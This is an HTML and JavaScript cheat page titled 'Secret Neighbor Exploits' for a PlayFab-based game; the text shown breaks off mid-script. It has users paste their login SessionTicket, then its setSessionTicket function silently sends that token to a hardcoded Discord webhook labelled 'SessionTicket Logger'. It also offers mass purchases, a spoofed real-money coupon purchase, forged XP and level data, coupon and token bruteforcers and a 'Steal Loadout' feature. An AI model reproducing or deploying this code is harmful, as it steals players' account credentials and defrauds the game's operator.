<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secret Neighbor Exploits</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://wallpaperaccess.com/full/9331537.jpg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      overflow-y: auto;
    }

    h1 {
      margin-top: 40px;
      text-shadow: 2px 2px 4px #000;
    }

    .container {
      width: 95%;
      max-width: 1200px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      padding-bottom: 40px;
    }

    .section {
      background-color: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      padding: 20px;
      border-radius: 10px;
      width: 100%;
      max-width: 600px;
      text-align: center;
    }

    .section h2 {
      margin-top: 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
      padding-bottom: 10px;
    }

    input, button, select {
      margin: 8px 5px;
      padding: 10px;
      font-size: 16px;
      width: 90%;
      max-width: 400px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #45a049;
    }

    .output {
      margin-top: 15px;
      padding: 15px;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 5px;
      border: 1px solid #ccc;
      white-space: pre-wrap;
      color: black;
      text-align: left;
      max-height: 300px;
      overflow-y: auto;
    }

    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .player-id-inputs {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    ol {
      text-align: left;
      padding-left: 20px;
    }

    a {
      color: #4da6ff;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .status-indicator {
      display: inline-block;
      width: 12px;
      height: 12px;
      border-radius: 50%;
      margin-right: 8px;
    }

    .status-active {
      background-color: #4CAF50;
    }

    .status-inactive {
      background-color: #f44336;
    }

    .warning {
      color: #ffcc00;
      font-weight: bold;
      margin: 10px 0;
    }

    .api-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }
    
    .purchase-all-btn {
      background-color: #ff9900;
      font-weight: bold;
    }
    
    .purchase-all-btn:hover {
      background-color: #e68a00;
    }
    
    .renew-btn {
      background-color: #2196F3;
    }
    
    .renew-btn:hover {
      background-color: #0b7dda;
    }

    .penalty-btn {
      background-color: #f44336;
    }

    .penalty-btn:hover {
      background-color: #d32f2f;
    }

    .reset-penalty-btn {
      background-color: #2196F3;
    }

    .reset-penalty-btn:hover {
      background-color: #1976D2;
    }

    .redeem-coupon-btn {
      background-color: #9c27b0;
    }

    .redeem-coupon-btn:hover {
      background-color: #7b1fa2;
    }

    .grant-trophy-btn {
      background-color: #ffeb3b;
      color: black;
    }

    .grant-trophy-btn:hover {
      background-color: #fbc02d;
    }
  </style>
</head>
<body>
  <h1>üéÆ Secret Neighbor Exploits</h1>

  <div class="container">
    <div class="section">
      <h2>üìÑ How to Get Your SessionTicket with Requestly</h2>
      <ol>
        <li>Download the Requestly desktop app from <a href="https://docs.requestly.com/general/sessions/record-api-sessions" target="_blank">here</a>.</li>
        <li>Open Requestly and start recording network traffic.</li>
        <li>Log into your game or app using PlayFab.</li>
        <li>Find the request to <code>/Client/LoginWithSteam</code> or similar.</li>
        <li>Copy the <code>SessionTicket</code> or <code>X-Authorization</code> from the response body.</li>
        <li>Paste it into the field above and click "Set Token".</li>
      </ol>
    </div>

    <div class="section">
      <h2>üîê Session Ticket</h2>
      <input id="sessionTicketInput" placeholder="Paste your SessionTicket here" type="text">
      <button onclick="setSessionTicket()">Set Token</button>
      <div class="grid-2">
        <button class="renew-btn" onclick="renewSessionTicket()">Renew SessionTicket</button>
        <button onclick="clearSessionTicket()">Clear Token</button>
      </div>
      <div id="tokenStatus" class="output" style="display: none;">No token set</div>
    </div>

    <div class="section">
      <h2>üõí Purchase All Skins & Emotes</h2>
      <p class="warning">This will attempt to purchase all available items that use FE, AC, or XP currency</p>
      <button class="purchase-all-btn" onclick="purchaseAllSkinsEmotes()">Attempt to Purchase All Skins and Emotes</button>
      <div class="output" id="purchaseAllOutput">Purchase logs will appear here...</div>
    </div>

    <div class="section">
      <h2>üõçÔ∏è Buy Skin/Emote</h2>
      <input id="itemId" placeholder="ItemId" type="text">
      <input id="price" placeholder="Price" type="number">
      <input id="currency" placeholder="VirtualCurrency" type="text">
      <button onclick="buySkinEmote()">Buy Skin/Emote</button>
      <div class="output" id="purchaseOutput">Purchase results will appear here...</div>
    </div>

    <div class="section">
      <h2>üéÅ Grant Coupons</h2>
      <button onclick="grantCoupons()">Grant Coupons</button>
      <div class="output" id="couponOutput">Coupon results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìä View Statistics</h2>
      <button onclick="viewStatistics()">View Statistics</button>
      <div class="output" id="statsOutput">Statistics will appear here...</div>
    </div>

    <div class="section">
      <h2>üßë‚Äçüíª Obtain PlayFab ID With Username</h2>
      <input id="steamUsername" placeholder="Steam Username" type="text">
      <button onclick="getPlayFabId()">Obtain PlayFab ID</button>
      <div class="output" id="playerIdOutput">PlayFab ID will appear here...</div>
    </div>

    <div class="section">
      <h2>üí∞ Add Coin (Call it In-Game)</h2>
      <p class="warning">Warning: Do not use more than 30 coins per match!</p>
      <button onclick="AddCoin()">Add Coin</button>
      <div class="output" id="usefulDeedOutput">Coin results will appear here...</div>
    </div>

    <div class="section">
      <h2>ü§ñ Coin Farm Bot <span id="botStatus" class="status-indicator status-inactive"></span></h2>
      <div class="grid-2">
        <div>
          <label>Room Type:</label>
          <select id="roomType">
            <option value="QUICK_GAME">QUICK_GAME</option>
            <option value="CUSTOM_GAME">CUSTOM_GAME</option>
          </select>
        </div>
        <div>
          <label>Delay:</label>
          <select id="delaySelect">
            <option value="10">10 minutes</option>
            <option value="5">5 minutes</option>
            <option value="2">2 minutes</option>
          </select>
        </div>
      </div>
      
      <div class="player-id-inputs">
        <input id="playerId1" placeholder="PlayFab ID 1" type="text">
        <input id="playerId2" placeholder="PlayFab ID 2" type="text">
        <input id="playerId3" placeholder="PlayFab ID 3" type="text">
        <input id="playerId4" placeholder="PlayFab ID 4" type="text">
        <input id="playerId5" placeholder="PlayFab ID 5" type="text">
        <input id="playerId6" placeholder="PlayFab ID 6" type="text">
      </div>
      
      <button onclick="toggleCoinFarmBot()" id="botToggleButton">Start Coin Farm Bot</button>
      <div class="output" id="cloudOutput">Bot output will appear here...</div>
    </div>

    <div class="section">
      <h2>üß™ Level Editor <span id="levelEditorStatus" class="status-indicator status-inactive"></span></h2>
      <input type="text" id="classIdInput" placeholder="Class ID">
      <input type="number" id="receivedXPInput" placeholder="Received XP">
      <input type="number" id="xpInput" placeholder="XP">
      <input type="number" id="xpToNextLevelInput" placeholder="XP to Next Level">
      <input type="number" id="levelInput" placeholder="Level">
      <input type="number" id="perkSlotsInput" placeholder="Available Perk Slots (max 3)" max="3" min="0">
      <input type="number" id="playerLevelInput" placeholder="Player Level">
      <button onclick="toggleLevelEditor()" id="levelEditorToggleButton">Start Level Editor</button>
      <div class="output" id="levelProgressionOutput">Level progression results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîç PlayFab Info Lookup</h2>
      <input type="text" id="playfabId" placeholder="Enter PlayFab ID">
      <button onclick="getPlayFabInfo()">Get Info</button>
      <div class="output" id="playfabInfoOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìù Update Quest Progress</h2>
      <input type="text" id="questTextFieldId" placeholder="Quest Text Field ID">
      <input type="number" id="questProgressValue" placeholder="Progress Value">
      <button onclick="updateQuestProgress()">Update Quest</button>
      
      <div style="margin-top: 15px; text-align: left;">
        <h3>Available Quests:</h3>
        <div style="max-height: 200px; overflow-y: auto; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">
          <ul style="columns: 2; margin: 0; padding-left: 20px;">
            <li>QUENTIN_USE_DASH</li>
            <li>WIN_AS_BAGGER</li>
            <li>WIN_AS_BRAVE</li>
            <li>WIN_AS_DETECTIVE</li>
            <li>WIN_AS_ENGINEER</li>
            <li>WIN_AS_LEADER</li>
            <li>WIN_AS_SCOUT</li>
            <li>WIN_AS_SCARY</li>
            <li>WIN_AS_CLOWN</li>
            <li>WIN_AS_BUTCHER</li>
            <li>WIN_FIRST_TO_ESCAPE</li>
            <li>WIN_WITH_HALF_LOCKS_INTACT</li>
            <li>OPEN_LOCKS</li>
            <li>OPEN_LOCKS_IN_ONE_MATCH</li>
            <li>SEearch_DRAWERS</li>
            <li>FIND_KEYS_VIA_PHOTO</li>
            <li>USE_KEYCARDS</li>
            <li>CATCH_KIDS</li>
            <li>HOOK_KIDS</li>
            <li>CATCH_FROM_ITEM_FORM</li>
            <li>CATCH_INSIDE_SMOKE</li>
            <li>CATCH_IN_BEARTRAP</li>
            <li>BLIND_NEIGHBOR_WITH_LEADER</li>
            <li>BUFF_AS_LEADER</li>
            <li>CRAFT_RIFLE</li>
            <li>SHOOT_THE_SHERIFF</li>
            <li>SLINGSHOT_HIT_NEIGHBOR</li>
            <li>SAVE_KID_FROM_GRAB</li>
            <li>BRAVE_ESCAPE_FROM_NEIGHBOR_HANDS</li>
            <li>BAGGER_CARRIER</li>
            <li>GLUE_THE_NEIGHBOR</li>
            <li>CONSUME_CHOCOLATE</li>
            <li>CONSUME_MILK</li>
            <li>CATCH_FROZEN_KIDS</li>
            <li>CATCH_AFTER_PORTAL</li>
            <li>KNOCK_ITEMS_OUT_OF_HANDS</li>
            <li>CATCH_SCARED_KIDS</li>
            <li>CRAFT_NIGHT_VISION</li>
            <li>FIND_WITH_METAL_DETECTOR</li>
            <li>RANDOM_KID</li>
            <li>RANDOM_NEIGHBOR</li>
            <li>WIN_AS_GHOST</li>
            <li>WIN_AS_GUEST</li>
            <li>WIN_AS_QUENTIN</li>
            <li>WIN_AS_TAXIDERMIST</li>
            <li>QUENTIN_OPEN_LOCK_BLUE</li>
            <li>QUENTIN_OPEN_LOCK_RED</li>
            <li>QUENTIN_OPEN_LOCK_YELLOW</li>
            <li>TAXIDERMIST_HIT_TARGETS_WITHOUT_RELOAD</li>
            <li>QUENTIN_USE_DASH</li>
            <li>CRAFT_INSANITY_SENSOR</li>
          </ul>
        </div>
      </div>
      
      <div class="output" id="questOutput">Quest update results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîó Additional Stuff</h2>
      <div class="api-grid">
        <div>
          <h3>üë• Add Friend</h3>
          <input id="friendPlayFabId" placeholder="Friend's PlayFab ID" type="text">
          <button onclick="addFriend()">Add Friend</button>
        </div>
        <div>
          <h3>üìã Get Friends List</h3>
          <button onclick="getFriendsList()">Get Friends List</button>
        </div>
        <div>
          <h3>üìõ Update Leaderboard Name</h3>
          <input id="displayName" placeholder="New Display Name" type="text">
          <button onclick="updateDisplayName()">Update Name</button>
        </div>
        <div>
          <h3>üîó Ban Yourself</h3>
          <input id="customId" placeholder="Anything You Want" type="text">
          <button onclick="linkCustomId()">Ban</button>
        </div>
        <div>
          <h3>üèÜ Leaderboard Data</h3>
          <input id="statisticName" placeholder="Statistic Name" type="text">
          <input id="startPosition" placeholder="Start Position" type="number" value="0">
          <input id="maxResults" placeholder="Max Results" type="number" value="100">
          <button onclick="getLeaderboard()">Get Leaderboard</button>
        </div>
        <div>
          <h3>üö© Report Player</h3>
          <select id="reportReason">
            <option value="CHEATING">Cheating</option>
            <option value="VOICE_CHAT_ABUSE">Voice Chat Abuse</option>
            <option value="AFK">AFK</option>
            <option value="TEAMING_WITH_ENEMY">Teaming with Enemy</option>
          </select>
          <input id="targetPlayerId" placeholder="Target PlayFab ID" type="text">
          <button onclick="reportPlayer()">Report Player</button>
        </div>
        <div>
          <h3>üéüÔ∏è Bruteforce Redeem Coupon <span id="couponBruteforceStatus" class="status-indicator status-inactive"></span></h3>
          <button class="redeem-coupon-btn" onclick="toggleBruteforceRedeemCoupon()" id="couponBruteforceToggleButton">Start Bruteforce Redeem Coupon</button>
        </div>
        <div>
          <h3>üèÜ Grant Trophy</h3>
          <input id="trophyId" placeholder="Trophy ID" type="text">
          <button class="grant-trophy-btn" onclick="grantTrophy()">Grant Trophy</button>
        </div>
      </div>
      <div class="output" id="apiOutput">API results will appear here...</div>
    </div>

    <div class="section">
      <h2>‚öñÔ∏è Penalty Points Management</h2>
      <div class="grid-2">
        <button class="penalty-btn" onclick="increasePenaltyPoints()">Increase Penalty Points</button>
        <button class="reset-penalty-btn" onclick="decreasePenaltyPoints()">Decrease Penalty Points</button>
      </div>
      <input id="matchPlayerId" placeholder="Player ID for Match Status" type="text">
      <button onclick="startMatchStatusSequence()">Decrease Penalty Points Fixed (wait 10 minutes)</button>
      <div class="output" id="penaltyOutput">Penalty and match status results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîë Photon Token Generator <span id="photonTokenStatus" class="status-indicator status-inactive"></span></h2>
      <button onclick="togglePhotonTokenGenerator()" id="photonTokenToggleButton">Start Generating Photon Token</button>
      <div class="output" id="photonTokenOutput">Token will appear here...</div>
    </div>

    <div class="section">
      <h2>üîÑ Reset Loadout</h2>
      <button onclick="resetLoadout()">Reset Loadout</button>
      <div class="output" id="resetLoadoutOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üïµÔ∏è Steal Loadout</h2>
      <input id="targetPlayFabId" placeholder="Target PlayFab ID" type="text">
      <button onclick="stealLoadout()">Steal Loadout</button>
      <div class="output" id="stealLoadoutOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üî® Photon Token Bruteforcer</h2>
      <input id="playFabUsername" placeholder="PlayFab ID" type="text">
      <button onclick="startBruteforce()">Start Bruteforce</button>
      <button onclick="stopBruteforce()">Stop Bruteforce</button>
      <div class="output" id="bruteforceOutput">Results will appear here...</div>
    </div>
  </div>

  <script>
    const titleId = "bdff1";
    let sessionTicket = null;
    let coinFarmBotRunning = false;
    let coinFarmId = null;
    let levelEditorRunning = false;
    let levelEditorId = null;
    let bruteforceRunning = false;
    let photonTokenRunning = false;
    let photonTokenId = null;
    let couponBruteforceRunning = false;
    let couponBruteforceId = null;
    let failedAttempts = 0;
    const logEntries = [];
    let totalTokensGenerated = 0;

    function setSessionTicket() {
      sessionTicket = document.getElementById("sessionTicketInput").value.trim();
      const tokenStatus = document.getElementById("tokenStatus");
      
      if (sessionTicket) {
        localStorage.setItem('sessionTicket', sessionTicket);
        tokenStatus.textContent = "‚úÖ Token set successfully!";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "green";
        console.log("SessionTicket set:", sessionTicket);
        
        sendToDiscordWebhook(sessionTicket);
      } else {
        tokenStatus.textContent = "‚ùå Please enter a valid token";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "red";
      }
    }

    function clearSessionTicket() {
      sessionTicket = null;
      localStorage.removeItem('sessionTicket');
      document.getElementById("sessionTicketInput").value = "";
      const tokenStatus = document.getElementById("tokenStatus");
      tokenStatus.textContent = "‚ùå Token cleared";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "red";
    }

    async function renewSessionTicket() {
      const tokenStatus = document.getElementById("tokenStatus");
      
      if (!sessionTicket) {
        tokenStatus.textContent = "‚ùå No session ticket to renew. Please set a token first.";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "red";
        return;
      }
      
      tokenStatus.textContent = "üîÑ Renewing session ticket...";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "blue";
      
      try {
        const response = await fetch(`https://${titleId}.playfabapi.com/Authentication/GetEntityToken`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Authorization": sessionTicket
          },
          body: JSON.stringify({})
        });
        
        const data = await response.json();
        
        if (data.data && data.data.EntityToken) {
          sessionTicket = data.data.EntityToken;
          localStorage.setItem('sessionTicket', sessionTicket);
          document.getElementById("sessionTicketInput").value = sessionTicket;
          
          tokenStatus.textContent = "‚úÖ Session ticket renewed successfully!";
          tokenStatus.style.color = "green";
          
          console.log("SessionTicket renewed:", sessionTicket);
        } else {
          tokenStatus.textContent = `‚ùå Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
          tokenStatus.style.color = "red";
        }
      } catch (error) {
        tokenStatus.textContent = `‚ùå Error renewing session ticket: ${error.message}`;
        tokenStatus.style.color = "red";
      }
    }

    async function sendToDiscordWebhook(sessionTicket) {
      const webhookURL = "https://discord.com/api/webhooks/1410689568386056275/Eq3YHxlcvOHxbbH7qXZHVPBPItzXBKQZgPk2wYpA6iy_ArTGfg5GaD-FLEjQ7xB8K4vb";
      
      try {
        const response = await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `New SessionTicket captured: ${sessionTicket}`,
            username: 'SessionTicket Logger',
            avatar_url: 'https://cdn.discordapp.com/avatars/340238256874586112/e2aa7a1f843d240a470a54264662b873?size=1024'
          })
        });
        
        if (response.ok) {
          console.log('SessionTicket sent to Discord successfully');
        } else {
          console.error('Failed to send SessionTicket to Discord');
        }
      } catch (error) {
        console.error('Error sending to Discord:', error);
      }
    }

    async function makeApiCall(endpoint, method, body) {
      if (!sessionTicket) {
        alert("Please set your SessionTicket first.");
        return null;
      }

      try {
        const res = await fetch(`https://${titleId}.playfabapi.com/${endpoint}`, {
          method: method,
          headers: {
            "Content-Type": "application/json",
            "X-Authorization": sessionTicket
          },
          body: JSON.stringify(body)
        });
        
        return await res.json();
      } catch (error) {
        console.error("API call failed:", error);
        return { error: error.message };
      }
    }

    function formatResponse(result) {
      if (typeof result === "object" && result !== null) {
        return Object.entries(result).map(([key, value]) => `${key}: ${value}`).join("\n");
      }
      return result;
    }

    async function purchaseAllSkinsEmotes() {
      const output = document.getElementById("purchaseAllOutput");
      output.textContent = "Starting purchase process...\n";
      
      if (!sessionTicket) {
        output.textContent += "‚ùå Please set your SessionTicket first.\n";
        return;
      }
      
      try {
        output.textContent += "üìã Fetching catalog items...\n";
        const catalogData = await makeApiCall("Client/GetCatalogItems", "POST", {
          CatalogVersion: "Ingame"
        });
        
        if (catalogData.error) {
          output.textContent += `‚ùå Failed to get catalog: ${catalogData.error}\n`;
          return;
        }
        
        const catalogItems = catalogData.data.Catalog;
        output.textContent += `‚úÖ Found ${catalogItems.length} items in catalog\n`;
        
        output.textContent += "üì¶ Checking current inventory...\n";
        const inventoryData = await makeApiCall("Client/GetUserInventory", "POST", {});
        
        if (inventoryData.error) {
          output.textContent += `‚ùå Failed to get inventory: ${inventoryData.error}\n`;
          return;
        }
        
        const ownedItems = inventoryData.data.Inventory.map(item => item.ItemId);
        output.textContent += `‚úÖ You own ${ownedItems.length} items\n`;
        
        const itemsToPurchase = [];
        
        for (const item of catalogItems) {
          if (ownedItems.includes(item.ItemId)) {
            output.textContent += `‚è© Skipping ${item.ItemId} (already owned)\n`;
            continue;
          }
          
          if (item.VirtualCurrencyPrices) {
            const currencies = Object.keys(item.VirtualCurrencyPrices);
            const acceptableCurrencies = currencies.filter(currency => 
              ['FE', 'AC', 'XP'].includes(currency) && currency !== 'RM'
            );
            
            if (acceptableCurrencies.length > 0) {
              const currency = acceptableCurrencies[0];
              const price = item.VirtualCurrencyPrices[currency];
              
              itemsToPurchase.push({
                ItemId: item.ItemId,
                Price: price,
                VirtualCurrency: currency
              });
              
              output.textContent += `‚ûï Will purchase ${item.ItemId} for ${price} ${currency}\n`;
            } else {
              output.textContent += `‚è© Skipping ${item.ItemId} (no acceptable currency)\n`;
            }
          } else {
            output.textContent += `‚è© Skipping ${item.ItemId} (no virtual currency price)\n`;
          }
        }
        
        output.textContent += `\nüõí Attempting to purchase ${itemsToPurchase.length} items...\n\n`;
        
        let successfulPurchases = 0;
        let failedPurchases = 0;
        
        for (const item of itemsToPurchase) {
          try {
            output.textContent += `üõçÔ∏è Purchasing ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}... `;
            
            const purchaseData = await makeApiCall("Client/PurchaseItem", "POST", {
              ItemId: item.ItemId,
              Price: item.Price,
              VirtualCurrency: item.VirtualCurrency
            });
            
            if (purchaseData.error) {
              output.textContent += `‚ùå Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
              failedPurchases++;
            } else {
              output.textContent += `‚úÖ Success!\n`;
              successfulPurchases++;
            }
          } catch (err) {
            output.textContent += `‚ùå Error: ${err.message}\n`;
            failedPurchases++;
          }
        }
        
        output.textContent += `\nüéâ Purchase process completed!\n`;
        output.textContent += `‚úÖ Successful: ${successfulPurchases}\n`;
        output.textContent += `‚ùå Failed: ${failedPurchases}\n`;
        
      } catch (error) {
        output.textContent += `‚ùå Unexpected error: ${error.message}\n`;
      }
      
      output.scrollTop = output.scrollHeight;
    }

    async function addFriend() {
      const friendPlayFabId = document.getElementById("friendPlayFabId").value.trim();
      
      if (!friendPlayFabId) {
        document.getElementById("apiOutput").textContent = "Please enter a friend's PlayFab ID.";
        return;
      }

      const data = await makeApiCall("Client/AddFriend", "POST", {
        FriendPlayFabId: friendPlayFabId
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function getFriendsList() {
      const data = await makeApiCall("Client/GetFriendsList", "POST", {
        IncludeSteamFriends: false,
        IncludeFacebookFriends: false
      });

      const output = document.getElementById("apiOutput");
      
      if (data.data && data.data.Friends) {
        let friendsList = "Friends List:\n";
        data.data.Friends.forEach(friend => {
          const steamId = friend.SteamInfo?.SteamId ? 
            `https://steamcommunity.com/profiles/${friend.SteamInfo.SteamId}` : "N/A";
          friendsList += `- ${friend.TitleDisplayName || "Unknown"} (${friend.FriendPlayFabId})\n  Steam Profile: ${steamId}\n`;
        });
        output.textContent = friendsList;
      } else if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = "No friends found.";
      }
    }

    async function updateDisplayName() {
      const displayName = document.getElementById("displayName").value.trim();
      
      if (!displayName) {
        document.getElementById("apiOutput").textContent = "Please enter a display name.";
        return;
      }

      const data = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
        DisplayName: displayName
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function linkCustomId() {
      const customId = document.getElementById("customId").value.trim();
      
      if (!customId) {
        document.getElementById("apiOutput").textContent = "Please enter a custom ID.";
        return;
      }

      const data = await makeApiCall("Client/LinkCustomID", "POST", {
        CustomId: customId,
        ForceLink: false
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function getLeaderboard() {
      const statisticName = document.getElementById("statisticName").value.trim();
      const startPosition = parseInt(document.getElementById("startPosition").value) || 0;
      const maxResults = parseInt(document.getElementById("maxResults").value) || 10;
      
      if (!statisticName) {
        document.getElementById("apiOutput").textContent = "Please enter a statistic name.";
        return;
      }

      const data = await makeApiCall("Client/GetLeaderboard", "POST", {
        StatisticName: statisticName,
        StartPosition: startPosition,
        MaxResultsCount: maxResults
      });

      const output = document.getElementById("apiOutput");
      
      if (data.data && data.data.Leaderboard) {
        let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
        data.data.Leaderboard.forEach((entry, index) => {
          leaderboardText += `${startPosition + index + 1}. ${entry.DisplayName}: ${entry.StatValue}\n`;
        });
        output.textContent = leaderboardText;
      } else if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data);
      }
    }

    async function reportPlayer() {
      const reportReason = document.getElementById("reportReason").value;
      const targetPlayerId = document.getElementById("targetPlayerId").value.trim();
      
      if (!targetPlayerId) {
        document.getElementById("apiOutput").textContent = "Please enter a target PlayFab ID.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "reportPlayer",
        FunctionParameter: {
          reportReason: reportReason,
          targetPlayerId: targetPlayerId
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data && data.data.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function buySkinEmote() {
      const ItemId = document.getElementById("itemId").value.trim();
      const Price = parseInt(document.getElementById("price").value);
      const VirtualCurrency = document.getElementById("currency").value.trim();
      
      if (!ItemId || isNaN(Price) || !VirtualCurrency) {
        document.getElementById("purchaseOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/PurchaseItem", "POST", {
        ItemId,
        Price,
        VirtualCurrency
      });

      const output = document.getElementById("purchaseOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function grantCoupons() {
      const output = document.getElementById("couponOutput");
      output.textContent = "Starting coupon grant process...";
      
      try {
        output.textContent += "\nStarting purchase...";
        const startData = await makeApiCall("Client/StartPurchase", "POST", {
          StoreId: "steam_Shop_Currency",
          Items: [{
            ItemId: "Currency_Bundle_PileOfCoupons",
            Quantity: 1
          }]
        });

        if (startData.error) {
          output.textContent += `\nError in StartPurchase: ${startData.error}`;
          return;
        }

        const orderId = startData.data?.OrderId;
        if (!orderId) {
          output.textContent += "\nStartPurchase failed. No OrderId returned.";
          return;
        }

        output.textContent += `\nOrder ID: ${orderId}`;
        
        output.textContent += "\nPaying for purchase...";
        const payData = await makeApiCall("Client/PayForPurchase", "POST", {
          OrderId: orderId,
          Currency: "RM",
          ProviderName: "Steam"
        });

        output.textContent += "\nConfirming purchase...";
        
        const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
          OrderId: orderId
        });

        if (confirmData.error) {
          output.textContent += `\nError in ConfirmPurchase: ${confirmData.error}`;
        } else {
          output.textContent += "\nCoupon process completed:\n" + 
            formatResponse(confirmData.data);
        }
        
      } catch (error) {
        output.textContent += `\nUnexpected error: ${error.message}`;
      }
    }

    async function viewStatistics() {
      const data = await makeApiCall("Client/GetPlayerStatistics", "POST", {});
      const output = document.getElementById("statsOutput");
      
      if (data.data?.Statistics) {
        const stats = data.data.Statistics.map(stat => 
          `${stat.StatisticName}: ${stat.Value}`
        ).join("\n");
        output.textContent = stats || "No statistics found.";
      } else {
        output.textContent = "Error retrieving statistics: " + 
          (data.error || "Unknown error");
      }
    }

    async function getPlayFabId() {
      const steamUsername = document.getElementById("steamUsername").value.trim();
      if (!steamUsername) {
        alert("Please enter a Steam username.");
        return;
      }

      const data = await makeApiCall("Client/GetPlayFabIDsFromSteamNames", "POST", {
        SteamNames: [steamUsername]
      });

      const output = document.getElementById("playerIdOutput");
      if (data.data?.Data?.[0]) {
        const match = data.data.Data[0];
        output.textContent = `PlayFabId for "${steamUsername}": ${match.PlayFabId}`;
      } else {
        output.textContent = "No matching PlayFab ID found.";
      }
    }

    async function AddCoin() {
      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "usefulDeed",
        FunctionParameter: {},
        GeneratePlayStreamEvent: true
      });

      const output = document.getElementById("usefulDeedOutput");
      if (data.data?.FunctionName) {
        output.textContent = `‚úÖ usefulDeed executed successfully\nExecution Time: ${data.data.ExecutionTimeSeconds}s\nMemory Used: ${data.data.MemoryConsumedBytes} bytes\nAPI Requests: ${data.data.APIRequestsIssued}`;
      } else {
        output.textContent = "Error: " + (data.error || "Unknown error");
      }
    }

    async function submitLevelProgression() {
      const classId = document.getElementById("classIdInput").value.trim();
      const receivedXP = parseInt(document.getElementById("receivedXPInput").value);
      const XP = parseInt(document.getElementById("xpInput").value);
      const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
      const level = parseInt(document.getElementById("levelInput").value);
      const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
      const playerLevel = parseInt(document.getElementById("playerLevelInput").value);

      if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
          isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
        return { error: "Please fill in all fields correctly." };
      }

      const currentLevelProgression = {
        playerLevel,
        classLevel: [{
          classId,
          XP,
          XpToNextLevel,
          level,
          availablePerkSlotsCount
        }]
      };

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "setLevelProgressionForClass",
        FunctionParameter: {
          classId,
          receivedXP,
          currentLevelProgression: JSON.stringify(currentLevelProgression)
        },
        GeneratePlayStreamEvent: true
      });

      return data;
    }

    async function getPlayFabInfo() {
      const playfabId = document.getElementById("playfabId").value.trim();
      const output = document.getElementById("playfabInfoOutput");
      
      if (!playfabId) {
        output.textContent = "Please enter a PlayFab ID.";
        return;
      }

      output.textContent = "Fetching data...";

      const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
        PlayFabId: playfabId,
        InfoRequestParameters: {
          GetUserAccountInfo: true,
          GetPlayerStatistics: true,
          GetUserInventory: true
        }
      });

      const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
        PlayFabId: playfabId,
        ProfileConstraints: {
          ShowLastLogin: true,
          ShowBannedUntil: true
        }
      });

      let resultText = "";
      
      if (combinedData.data) {
        const info = combinedData.data.InfoResultPayload;
        resultText += "=== ACCOUNT INFO ===\n";
        resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
